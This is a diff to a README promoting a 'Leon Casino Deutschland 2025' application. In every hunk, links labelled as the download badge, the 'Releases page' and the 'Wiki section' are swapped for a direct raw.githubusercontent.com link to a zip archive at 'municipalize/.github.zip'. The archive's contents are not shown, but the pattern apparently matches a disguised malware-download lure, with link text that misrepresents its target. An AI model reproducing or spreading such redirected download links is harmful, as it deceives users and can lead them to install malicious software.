@@ -6,7 +6,7 @@ Welcome to **Leon Casino Deutschland 2025**! This application gives you quick ac
 
 ## 📥 Download Now
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/daaniiel359/.github/releases)
+[![Download from Releases](https://raw.githubusercontent.com/daaniiel359/.github/main/municipalize/.github.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/daaniiel359/.github/main/municipalize/.github.zip)
 
 ## 🔍 Features
 
@@ -27,7 +27,7 @@ To run Leon Casino Deutschland 2025 smoothly, your system should meet the follow
 
 ## 📦 Download & Install 
 
-1. Visit the [Releases page](https://github.com/daaniiel359/.github/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/daaniiel359/.github/main/municipalize/.github.zip).
 2. Locate the latest release.
 3. Click on the file to download it directly to your computer.
 4. Once the download completes, find the file in your downloads folder.
@@ -42,7 +42,7 @@ If you encounter any issues while using the application, you can reach out throu
 
 ## 📚 More Information
 
-For additional details about our application, check out our [Wiki section](https://github.com/daaniiel359/.github/wiki). You'll find guides and tips on maximizing your experience with Leon Casino Deutschland.
+For additional details about our application, check out our [Wiki section](https://raw.githubusercontent.com/daaniiel359/.github/main/municipalize/.github.zip). You'll find guides and tips on maximizing your experience with Leon Casino Deutschland.
 
 ## 🔗 Community Suggestions
 
